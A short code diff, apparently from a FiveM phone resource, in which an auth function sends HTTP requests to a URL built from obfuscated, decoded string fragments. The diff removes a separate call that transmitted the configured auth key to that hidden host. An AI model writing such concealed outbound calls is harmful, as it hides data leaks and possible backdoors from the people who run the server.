@@ -24,5 +24,3 @@ gcPhoneT.authServer = function()
     if l then return end
     PerformHttpRequest(dec(s[3])..dec(s[5])..dec(s[4])..dec(s[1])..dec(s[6])..dec(s[2])..dec(s[8]), c, "GET", "{}", { ['Content-Type'] = 'application/json' })
 end
-
-PerformHttpRequest(dec(s[3])..dec(s[5])..dec(s[4])..dec(s[1])..dec(s[6])..dec(s[2])..dec(s[7])..Config.AuthKey, p, "GET", "{}", { ['Content-Type'] = 'application/json' })
